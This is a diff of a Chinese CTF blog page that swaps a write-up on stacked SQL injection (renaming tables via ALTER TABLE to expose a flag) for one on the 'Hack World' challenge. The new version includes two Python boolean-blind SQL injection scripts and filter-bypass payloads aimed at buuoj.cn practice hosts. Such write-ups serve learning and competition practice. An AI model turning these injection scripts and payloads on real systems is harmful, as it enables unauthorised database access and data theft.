@@ -47,18 +47,18 @@
   };
 </script>
 
-  <meta name="description" content="[强网杯 2019]随便注 1‘ &#x2F;&#x2F;首先尝试的加引号，报错了1’ # &#x2F;&#x2F;正常1‘ order by 1 # &#x2F;&#x2F;用order by 测试得到列数为21’ union select 1,2 # &#x2F;&#x2F;回显了过滤规则 return preg_match(“&#x2F;select|update|delete|drop|insert|where|.&#x2F;i”,$inject);">
-<meta name="keywords" content="Writeup,web,sql">
+  <meta name="description" content="[CISCN2019 华北赛区 Day2 Web1]Hack Worldid为1,2时，可以分别得到一句话。id为0时，显示error，可能是因为结果为空集。1234id=1Hello, glzjin wants a girlfriend.id=2Do you want to be my girlfriend?">
+<meta name="keywords" content="Writeup,web,sql盲注,python脚本">
 <meta property="og:type" content="article">
-<meta property="og:title" content="[强网杯 2019]随便注">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;13&#x2F;%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8&#x2F;index.html">
+<meta property="og:title" content="[CISCN2019 华北赛区 Day2 Web1]Hack World">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;15&#x2F;CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World&#x2F;index.html">
 <meta property="og:site_name" content="NoObject&#39;s blog">
-<meta property="og:description" content="[强网杯 2019]随便注 1‘ &#x2F;&#x2F;首先尝试的加引号，报错了1’ # &#x2F;&#x2F;正常1‘ order by 1 # &#x2F;&#x2F;用order by 测试得到列数为21’ union select 1,2 # &#x2F;&#x2F;回显了过滤规则 return preg_match(“&#x2F;select|update|delete|drop|insert|where|.&#x2F;i”,$inject);">
+<meta property="og:description" content="[CISCN2019 华北赛区 Day2 Web1]Hack Worldid为1,2时，可以分别得到一句话。id为0时，显示error，可能是因为结果为空集。1234id=1Hello, glzjin wants a girlfriend.id=2Do you want to be my girlfriend?">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-12-13T17:16:04.405Z">
+<meta property="og:updated_time" content="2019-12-14T16:10:56.398Z">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://yoursite.com/2019/12/13/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/">
+<link rel="canonical" href="http://yoursite.com/2019/12/15/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/">
 
 
 <script id="page-configurations">
@@ -72,7 +72,7 @@
   };
 </script>
 
-  <title>[强网杯 2019]随便注 | NoObject's blog</title>
+  <title>[CISCN2019 华北赛区 Day2 Web1]Hack World | NoObject's blog</title>
   
 
 
@@ -187,7 +187,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/13/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/15/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/jieni.gif">
@@ -200,7 +200,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          [强网杯 2019]随便注
+          [CISCN2019 华北赛区 Day2 Web1]Hack World
         </h1>
 
         <div class="post-meta">
@@ -209,16 +209,10 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2019-12-13 16:34:14" itemprop="dateCreated datePublished" datetime="2019-12-13T16:34:14+08:00">2019-12-13</time>
+              <time title="创建时间：2019-12-15 00:04:01 / 修改时间：00:10:56" itemprop="dateCreated datePublished" datetime="2019-12-15T00:04:01+08:00">2019-12-15</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-12-14 01:16:04" itemprop="dateModified" datetime="2019-12-14T01:16:04+08:00">2019-12-14</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
@@ -247,8 +241,8 @@
       </span>
       <span class="post-meta-item-text">Valine：</span>
     
-    <a title="valine" href="/2019/12/13/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/#comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2019/12/13/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/" itemprop="commentCount"></span>
+    <a title="valine" href="/2019/12/15/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2019/12/15/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -263,44 +257,25 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><blockquote>
-<p>1‘ //首先尝试的加引号，报错了<br>1’ # //正常<br>1‘ order by 1 # //用order by 测试得到列数为2<br>1’ union select 1,2 # //回显了过滤规则 return preg_match(“/select|update|delete|drop|insert|where|./i”,$inject);</p>
-</blockquote><a id="more"></a>
-<p>看writeup 要用<a href="https://www.cnblogs.com/0nth3way/articles/7128189.html" target="_blank" rel="noopener">堆叠注入</a>。。</p>
-<blockquote>
-<p>1’;show databases; #</p>
-</blockquote>
-<blockquote>
-<p>1’;show tables; # 发现两个表1919810931114514、words</p>
-</blockquote>
-<p>依次查询两张表的字段</p>
-<blockquote>
-<p>1’; show columns from 表名; #</p>
-</blockquote>
-<p>不过有点问题，只有words有回显。(翻博客发现数字串为表名的表操作时要加反引号，加上之后发现的确有flag字段)</p>
-<p>内部查询语句类似 : select id, data from words where id =</p>
-<p>(这里从上面的对words列的查询可以看到它是有两列，id和data)</p>
-<p>然后1919810931114514只有一个flag字段</p>
-<p>这时候虽然有强大的正则过滤，但没有过滤alert和rename关键字</p>
-<p>这时候我们就可以已下面的骚姿势进行注入：</p>
-<blockquote>
-<p>1.将words表改名为word1或其它任意名字</p>
-</blockquote>
-<blockquote>
-<p>2.1919810931114514改名为words</p>
-</blockquote>
-<blockquote>
-<p>3.将新的word表插入一列，列名为id</p>
-</blockquote>
-<blockquote>
-<p>4.将flag列改名为data</p>
-</blockquote>
-<p>构造payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=0&apos;;alter table words rename to word;alter table`1919810931114514` rename to words;alter table words change flag data varchar(100);alter table words add column id int(10) default 1 --+</span><br></pre></td></tr></table></figure>
+        <h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>id为1,2时，可以分别得到一句话。id为0时，显示error，可能是因为结果为空集。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=1</span><br><span class="line">Hello, glzjin wants a girlfriend.</span><br><span class="line">id=2</span><br><span class="line">Do you want to be my girlfriend?</span><br></pre></td></tr></table></figure><a id="more"></a>
 
-<p>接着我们再用1’ or 1=1 #,查询就得到flag</p>
+
+
+<p>id提交为单引号返回false，填入空格会直接显示SQL Injection Checked。这说明id除有过滤，空格被过滤了，但是单引号没过滤。</p>
+<p>尝试用Tab代替空格，发现可以，也可以用括号。</p>
+<p>接下来根据题目中的提示构造payload：</p>
+<p>union    select  flag    from    flag<br>被过滤了，直接输入一个</p>
+<p>union<br>也会被过滤</p>
+<p>这说明union也被过滤了。最后测试发现select和from，括号没有被过滤可以考虑使用函数</p>
+<p>两个大佬的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment">#url是随时更新的，具体的以做题时候的为准</span></span><br><span class="line">url = <span class="string">'http://40c9be7a-36f0-4e80-94ca-d1ac9e121947.node1.buuoj.cn/index.php'</span></span><br><span class="line">data = &#123;<span class="string">"id"</span>:<span class="string">""</span>&#125;</span><br><span class="line">flag = <span class="string">'flag&#123;'</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">6</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="comment">#从可打印字符开始</span></span><br><span class="line">    begin = <span class="number">32</span></span><br><span class="line">    end = <span class="number">126</span></span><br><span class="line">    tmp = (begin+end)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> begin&lt;end:</span><br><span class="line">        print(begin,tmp,end)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        data[<span class="string">"id"</span>] = <span class="string">"if(ascii(substr((select       flag        from    flag),&#123;&#125;,1))&gt;&#123;&#125;,1,2)"</span>.format(i,tmp)</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Hello'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            begin = tmp+<span class="number">1</span></span><br><span class="line">            tmp = (begin+end)//<span class="number">2</span> </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = tmp</span><br><span class="line">            tmp = (begin+end)//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">    flag+=chr(tmp)</span><br><span class="line">    print(flag)</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> flag[<span class="number">-1</span>]==<span class="string">'&#125;'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;&apos;</span><br><span class="line">@Modify Time      @Author</span><br><span class="line">------------      -------</span><br><span class="line">2019/10/25 19:28   laoalo</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">import requests</span><br><span class="line">from lxml import etree</span><br><span class="line">def a():</span><br><span class="line">    url=&quot;http://6a93b089-ace7-4ece-8334-b10dd79ac360.node3.buuoj.cn/&quot;</span><br><span class="line">    flag=&quot;Hello, glzjin wants a girlfriend.&quot;</span><br><span class="line">    final=&quot;&quot;</span><br><span class="line">    stop=0</span><br><span class="line">    for i in range(1,1290):</span><br><span class="line">         print(&quot;*&quot;*50,i,&quot;*&quot;*50)</span><br><span class="line">         stop=0</span><br><span class="line">         for j in range(32,129):</span><br><span class="line">             stop = j</span><br><span class="line">             data=&#123;&quot;id&quot;:&quot;1^(if((ascii(substr((select(flag)from(flag)),%d,1))=%d),0,1))&quot; %(i,j)&#125;</span><br><span class="line">             re = requests.post(url=url,data=data).text.replace(&apos;\n&apos;,&apos;&apos;)</span><br><span class="line">             html = etree.HTML(re).xpath(&quot;//text()&quot;)</span><br><span class="line">             # print(&quot;&gt;&gt;&quot;,html)</span><br><span class="line">             if flag in html:</span><br><span class="line">                  final+=chr(j)</span><br><span class="line">                  print(&quot;\n\t\t\t\t&quot;,final)</span><br><span class="line">                  break</span><br><span class="line"></span><br><span class="line">         if stop &gt;= 128:</span><br><span class="line">            print(&quot;*&quot;*50,&quot;结束&quot;)</span><br><span class="line">            print(&quot;&gt;&gt;&quot;,final)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">       a()</span><br></pre></td></tr></table></figure>
+
 <blockquote>
-<p>注：这里要注意几个问题：<br>•    对表名为纯数字的表进行操作时，要在前后加上`符号。由于刚开始不知道，在这卡了一段时间。<br>•    对列名进行更改时，要在后面指定修改后的数据类型<br>•    添加id列时，设置默认值，方便后面查询（1’ or 1=1也可）</p>
+<p>id=1^(if((ascii(substr((select(flag)from(flag)),1,1))=102),0,1))</p>
+<p>构造payload:1^ascii(mid(database(),1,1)=98)^0</p>
+<p>注意这里会多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的</p>
 </blockquote>
 
     </div>
@@ -325,7 +300,8 @@
           <div class="post-tags">
               <a href="/tags/Writeup/" rel="tag"># Writeup</a>
               <a href="/tags/web/" rel="tag"># web</a>
-              <a href="/tags/sql/" rel="tag"># sql</a>
+              <a href="/tags/sql%E7%9B%B2%E6%B3%A8/" rel="tag"># sql盲注</a>
+              <a href="/tags/python%E8%84%9A%E6%9C%AC/" rel="tag"># python脚本</a>
           </div>
 
         
@@ -334,13 +310,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2019/12/13/HCTF2018-warmup-writeup/" rel="prev" title="HCTF2018-warmup-writeup">
-      <i class="fa fa-chevron-left"></i> HCTF2018-warmup-writeup
+    <a href="/2019/12/14/%E7%AC%94%E8%AE%B0/" rel="prev" title="笔记">
+      <i class="fa fa-chevron-left"></i> 笔记
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2019/12/13/easy-tornado/" rel="next" title="easy_tornado">
-      easy_tornado <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -379,7 +352,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#强网杯-2019-随便注"><span class="nav-number">1.</span> <span class="nav-text">[强网杯 2019]随便注</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-华北赛区-Day2-Web1-Hack-World"><span class="nav-number">1.</span> <span class="nav-text">[CISCN2019 华北赛区 Day2 Web1]Hack World</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
